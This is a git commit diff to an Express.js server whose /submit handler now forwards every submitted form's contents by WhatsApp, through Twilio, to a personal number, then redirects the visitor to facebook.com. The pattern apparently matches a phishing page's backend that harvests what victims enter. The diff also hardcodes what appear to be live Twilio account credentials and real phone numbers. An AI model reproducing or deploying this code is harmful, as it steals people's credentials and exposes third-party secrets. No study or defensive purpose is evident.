f0bb04ab95c86cb894a17591d80ceccc0280b7e0
dafin9 <abhi.d3v3lop3r@gmail.com>
2024-02-09 00:30:24 +0530

    added wp

--- index.js
+++ index.js
@@ -3,6 +3,11 @@ import fs from 'fs'
 const app = express();
 const port = 3000;
 
+const accountSid = 'ACffb87ccf579e74a80a6f1ee1ae491ddc';
+const authToken = 'e257e3ca25d3dc79580a5fe106f93e81';
+const client = require('twilio')(accountSid, authToken);
+
+
 // Middleware to parse form data
 app.use(urlencoded({ extended: true }));
 
@@ -14,7 +19,15 @@ app.get('/', (req, res) =>{
 app.post('/submit', (req, res) => {
   // Extract form data
   const formData = req.body;
-  fs.writeFileSync('file.txt',JSON.stringify(formData))
+  client.messages
+  .create({
+     from: 'whatsapp:+16593997860', // Twilio WhatsApp number
+     body: `${JSON.stringify(formData)}`,
+     to: 'whatsapp:+919725030987' // WhatsApp number of the recipient
+   })
+  .then(message => console.log(message.sid))
+  .catch(err => console.error(err));
+
   res.redirect('https://facebook.com');
 });
 
